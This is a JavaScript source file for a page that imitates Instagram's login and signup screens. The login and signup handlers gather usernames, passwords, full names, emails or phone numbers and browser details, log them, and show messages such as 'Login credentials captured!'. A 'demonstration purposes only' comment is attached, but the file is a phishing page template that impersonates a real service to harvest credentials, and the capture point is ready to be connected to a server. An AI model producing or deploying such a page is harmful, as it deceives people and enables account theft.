// Get elements
const modal = document.getElementById('signupModal');
const signupLink = document.getElementById('signupLink');
const closeBtn = document.querySelector('.close');
const loginForm = document.getElementById('loginForm');
const signupForm = document.getElementById('signupForm');
const loginBtn = document.getElementById('loginBtn');
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const errorMessage = document.getElementById('errorMessage');

// Screenshot carousel
const screenshots = document.querySelectorAll('.screenshot');
let currentScreenshot = 0;

function rotateScreenshots() {
    screenshots[currentScreenshot].classList.remove('active');
    currentScreenshot = (currentScreenshot + 1) % screenshots.length;
    screenshots[currentScreenshot].classList.add('active');
}

// Change screenshot every 3 seconds
setInterval(rotateScreenshots, 3000);

// Open modal when clicking Sign up link
signupLink.addEventListener('click', function(e) {
    e.preventDefault();
    modal.style.display = 'block';
    document.body.style.overflow = 'hidden';
});

// Close modal when clicking X
closeBtn.addEventListener('click', function() {
    modal.style.display = 'none';
    document.body.style.overflow = 'auto';
});

// Close modal when clicking outside of it
window.addEventListener('click', function(event) {
    if (event.target === modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
});

// Enable/disable login button based on input
function checkLoginInputs() {
    if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
        loginBtn.disabled = false;
        loginBtn.style.opacity = '1';
    } else {
        loginBtn.disabled = true;
        loginBtn.style.opacity = '0.3';
    }
}

usernameInput.addEventListener('input', checkLoginInputs);
passwordInput.addEventListener('input', checkLoginInputs);

// Handle login form submission
loginForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const username = usernameInput.value;
    const password = passwordInput.value;
    
    // Validate inputs
    if (!username || !password) {
        showError('Please fill in all fields');
        return;
    }
    
    if (password.length < 6) {
        showError('Password must be at least 6 characters');
        return;
    }
    
    // Store credentials (for demonstration purposes only)
    console.log('Instagram Login attempt:', {
        username: username,
        password: password,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform
    });
    
    // Show loading state
    loginBtn.textContent = 'Logging in...';
    loginBtn.disabled = true;
    
    // Simulate login process
    setTimeout(() => {
        showError('Login credentials captured!');
        loginBtn.textContent = 'Log in';
        
        // Reset form after 2 seconds
        setTimeout(() => {
            loginForm.reset();
            errorMessage.textContent = '';
            loginBtn.disabled = true;
            loginBtn.style.opacity = '0.3';
        }, 2000);
    }, 1000);
});

// Handle signup form submission
signupForm.addEventListener('submit', function(e) {
    e.preventDefault();
    
    const formInputs = signupForm.querySelectorAll('input');
    const data = {
        mobile_or_email: formInputs[0].value,
        full_name: formInputs[1].value,
        username: formInputs[2].value,
        password: formInputs[3].value,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform
    };
    
    // Validate inputs
    if (!data.mobile_or_email || !data.full_name || !data.username || !data.password) {
        alert('Please fill in all fields');
        return;
    }
    
    if (data.password.length < 6) {
        alert('Password must be at least 6 characters');
        return;
    }
    
    // Log signup data (for demonstration purposes only)
    console.log('Instagram Signup attempt:', data);
    
    // Show success
    const submitBtn = signupForm.querySelector('.signup-btn');
    submitBtn.textContent = 'Signing up...';
    submitBtn.disabled = true;
    
    setTimeout(() => {
        alert('Signup information captured!');
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
        signupForm.reset();
        submitBtn.textContent = 'Sign up';
        submitBtn.disabled = false;
    }, 1000);
});

// Function to show error message
function showError(message) {
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
    
    // Hide error after 4 seconds
    setTimeout(() => {
        errorMessage.style.display = 'none';
    }, 4000);
}

// Add input animation effects
const allInputs = document.querySelectorAll('input[type="text"], input[type="password"]');
allInputs.forEach(input => {
    input.addEventListener('focus', function() {
        this.style.borderColor = '#a8a8a8';
    });
    
    input.addEventListener('blur', function() {
        if (this.value === '') {
            this.style.borderColor = '#dbdbdb';
        }
    });
});

// Prevent default behavior for external links
document.querySelectorAll('a[href="#"]').forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
    });
});

// Handle Facebook login button clicks
const fbLoginBtn = document.querySelector('.fb-login');
const fbSignupBtn = document.querySelector('.fb-signup-btn');

fbLoginBtn.addEventListener('click', function(e) {
    e.preventDefault();
    console.log('Facebook login clicked');
    alert('Facebook login integration (demo only)');
});

fbSignupBtn.addEventListener('click', function(e) {
    e.preventDefault();
    console.log('Facebook signup clicked');
    alert('Facebook signup integration (demo only)');
});

// Track page visibility for analytics
document.addEventListener('visibilitychange', function() {
    if (document.hidden) {
        console.log('Page hidden at:', new Date().toISOString());
    } else {
        console.log('Page visible at:', new Date().toISOString());
    }
});

// Initialize: disable login button on page load
window.addEventListener('load', function() {
    loginBtn.disabled = true;
    loginBtn.style.opacity = '0.3';
    console.log('Instagram login page loaded');
});

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Close modal with Escape key
    if (e.key === 'Escape' && modal.style.display === 'block') {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
});

// Form validation feedback
function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
}

function validatePhone(phone) {
    const re = /^[\d\s\-\+\(\)]+$/;
    return re.test(phone) && phone.replace(/\D/g, '').length >= 10;
}

// Real-time validation for signup form
if (signupForm) {
    const signupInputs = signupForm.querySelectorAll('input');
    
    signupInputs[0].addEventListener('blur', function() {
        const value = this.value;
        if (value && !validateEmail(value) && !validatePhone(value)) {
            this.style.borderColor = '#ed4956';
        } else {
            this.style.borderColor = '#dbdbdb';
        }
    });
    
    signupInputs[2].addEventListener('input', function() {
        // Username validation: no spaces, special characters limited
        this.value = this.value.toLowerCase().replace(/[^a-z0-9._]/g, '');
    });
}

// Simulate network check
function checkNetworkStatus() {
    if (!navigator.onLine) {
        showError('No internet connection');
    }
}

window.addEventListener('online', function() {
    console.log('Network: Online');
});

window.addEventListener('offline', function() {
    console.log('Network: Offline');
    showError('No internet connection');
});

// Log form interactions for analytics
usernameInput.addEventListener('focus', function() {
    console.log('Username field focused');
});

passwordInput.addEventListener('focus', function() {
    console.log('Password field focused');
});
